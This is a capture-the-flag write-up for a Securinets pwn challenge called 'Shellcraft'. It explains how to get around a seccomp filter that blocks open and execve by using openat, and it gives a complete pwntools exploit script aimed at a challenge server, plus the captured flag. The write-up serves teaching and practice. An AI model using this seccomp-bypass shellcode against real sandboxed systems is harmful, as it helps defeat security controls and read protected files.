# Shellcraft

## Challenge

The program reads shell code then executes it.

Seccomp filters are set to disallow the following syscalls:

- open
- clone
- fork
- vfork
- execve
- ptrace
- execveat

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

### Seccomp

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0013
 0006: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0013
 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013
 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

## Solution

While `open` is disallowed, we can use the `openat` syscall to read files.

We first use a `write` syscall to print a single arbitrary byte to signal that the shellcode is loaded.
Then we use a `read` call to read the filename to read from.

As PIE is off, we need to find a writable address to store this filename.
For this, we can use RBP as it is a pointer to the stack.

We then call `openat` with `AT_FDCWD` as our directory file descriptor to read the file with the given filename relative to the current directory.
This will give us a file handle stored in RAX.

We then read the contents of the file onto the stack and print it, which will display the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.216.39.14 --port 1236 shellcraft
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shellcraft')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.216.39.14'
port = int(args.PORT or 1236)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

shellcode  = asm(shellcraft.write(1, 'rbp', 1))
shellcode += asm(shellcraft.read(0, 'rbp', 100))
shellcode += asm(shellcraft.openat('AT_FDCWD', 'rbp', 0))
shellcode += asm(shellcraft.read('rax', 'rbp', 100))
shellcode += asm(shellcraft.write(1, 'rbp', 100))

io.send(shellcode)

io.recv(1)

io.send(b"flag.txt\x00")

io.interactive()
```

## Flag

```
Securinets{56000a2e8205998dd69d74c30d6b1daca2863e66184c088b}
```
